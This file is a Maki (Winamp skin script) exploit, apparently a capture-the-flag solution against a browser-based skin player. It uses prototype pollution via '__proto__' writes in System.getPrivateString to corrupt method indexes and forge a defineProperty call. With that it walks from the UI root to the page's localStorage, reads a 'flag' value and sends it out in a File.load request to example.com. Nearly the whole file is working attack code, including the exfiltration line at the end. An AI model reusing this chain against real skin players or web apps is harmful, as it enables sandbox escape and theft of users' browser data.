#include "lib/std.mi"

extern class @{593DBA22-D077-4976-B952-F4713655400B}@ Object &Config;
extern class @{836F8B2E-E0D1-4DB4-937F-0D0A04C8DCD1}@ Object &File;

extern File.load(string path);
extern boolean File.exists();

Function enableGetitem();

// corrupt index 0xff to point to getitem with an undefined returnType
// to avoid assertions on return when we return a non-boolean value from bitlist
enableGetitem() {
  Config x = new Config; // needs to be any object
  System.getPrivateString("__proto__", "255", x);
  System.getPrivateString("__proto__", "name", "getitem");
  System.getPrivateString("__proto__", "undefined", "87c6577849fee743cc09f98556fd2a53");
}

Function setupDefineProperty();

// corrupt index 0xfe to point to defineProperty using a fake class    
setupDefineProperty() {
  BitList grabber = new BitList;

  // array with toLowerCase defined as toString such that toLowerCase returns the element at index 0
  BitList fakeNameContainer = new BitList;
  fakeNameContainer.setitem(0, "defineProperty");
  fakeNameContainer.setitem("toLowerCase", fakeNameContainer.getitem("toString"));
  grabber.setitem("__proto__", fakeNameContainer);
  Object fakeName = grabber.getitem("_items");

  // grab Object.prototype
  Config cfg = new Config;
  grabber.setitem("__proto__", cfg);
  Object obj0 = grabber.getitem("_uiRoot");
  grabber.setitem("__proto__", obj0);
  Object obj1 = grabber.getitem("_bitmaps");
  grabber.setitem("__proto__", obj1);
  Object obj2 = grabber.getitem("constructor");

  // build methods needed to define a fake class method description
  BitList obj3b = new BitList;
  BitList obj4b = new BitList;
  obj4b.setitem("name", "defineproperty");
  BitList obj5b = new BitList;
  obj5b.setitem("length", 3);
  grabber.setitem("__proto__", obj5b);
  Object obj5 = grabber.getitem("_items");
  obj4b.setitem("parameters", obj5);
  grabber.setitem("__proto__", obj4b);
  Object obj4 = grabber.getitem("_items");
  obj3b.setitem("0", obj4);
  grabber.setitem("__proto__", obj3b);
  Object obj3 = grabber.getitem("_items");
  BitList obj6b = new BitList;
  obj6b.setitem("prototype", obj2);
  obj6b.setitem("functions", obj3);
  grabber.setitem("__proto__", obj6b);
  Object obj6 = grabber.getitem("_items");
  BitList obj7b = new BitList;
  obj7b.setitem("name", fakeName);
  obj7b.setitem("typeOffset", "object_typeoffset");
  grabber.setitem("__proto__", obj7b);
  Object obj7 = grabber.getitem("_items");

  // clobber
  System.getPrivateString("__proto__", "254", obj7);
  System.getPrivateString("__proto__", "object_typeoffset", "object_guid");
  System.getPrivateString("__proto__", "object_guid", obj6);
}

System.onScriptLoaded() {
  enableGetitem();
  setupDefineProperty();

  BitList grabber = new BitList;

  // Grab the `Object` type, since we need to call methods on it
  Config cfg = new Config;
  grabber.setitem("__proto__", cfg);
  Object obj8 = grabber.getitem("_uiRoot");
  grabber.setitem("__proto__", obj8);
  Object obj9 = grabber.getitem("_bitmaps");
  grabber.setitem("__proto__", obj9);
  Object obj10 = grabber.getitem("constructor");

  // we cannot call defineProperty directly on `obj10` since Object is a function and
  // stops us from calling any function which is a property of a function. instead, we'll
  // assign the constructor as the proto of an object and use it through that
  BitList fakeObject = new BitList;
  fakeObject.setitem("__proto__", obj10);
  grabber.setitem("__proto__", fakeObject);
  System fakeSystem = grabber.getitem("_items");

  // we'll post-process the compiled maki to make `onDownloadFinished` call `defineProperty` instead.
  // this entire chain simply grabs `_uiRoot._div.ownerDocument.defaultView.localStorage.flag`
  BitList obj11 = new BitList;
  BitList obj13b = new BitList;
  obj13b.setitem("value", cfg);
  grabber.setitem("__proto__", obj13b);
  Object obj13 = grabber.getitem("_items");
  fakeSystem.onDownloadFinished(obj11, "_items", obj13);
  string obj12 = obj11.getitem("_uiRoot");
  BitList obj15b = new BitList;
  obj15b.setitem("value", obj12);
  grabber.setitem("__proto__", obj15b);
  Object obj15 = grabber.getitem("_items");
  fakeSystem.onDownloadFinished(obj11, "_items", obj15);
  string obj14 = obj11.getitem("_div");
  BitList obj17b = new BitList;
  obj17b.setitem("value", obj14);
  grabber.setitem("__proto__", obj17b);
  Object obj17 = grabber.getitem("_items");
  fakeSystem.onDownloadFinished(obj11, "_items", obj17);
  string obj16 = obj11.getitem("ownerDocument");
  BitList obj19b = new BitList;
  obj19b.setitem("value", obj16);
  grabber.setitem("__proto__", obj19b);
  Object obj19 = grabber.getitem("_items");
  fakeSystem.onDownloadFinished(obj11, "_items", obj19);
  string obj18 = obj11.getitem("defaultView");
  BitList obj21b = new BitList;
  obj21b.setitem("value", obj18);
  grabber.setitem("__proto__", obj21b);
  Object obj21 = grabber.getitem("_items");
  fakeSystem.onDownloadFinished(obj11, "_items", obj21);
  string obj20 = obj11.getitem("localStorage");
  BitList obj23b = new BitList;
  obj23b.setitem("value", obj20);
  grabber.setitem("__proto__", obj23b);
  Object obj23 = grabber.getitem("_items");
  fakeSystem.onDownloadFinished(obj11, "_items", obj23);
  string obj22 = obj11.getitem("flag");

  // finally, exfiltrate the flag
  File f = new File;
  f.load("https://example.com/?flag=" + obj22);
  f.exists();
}
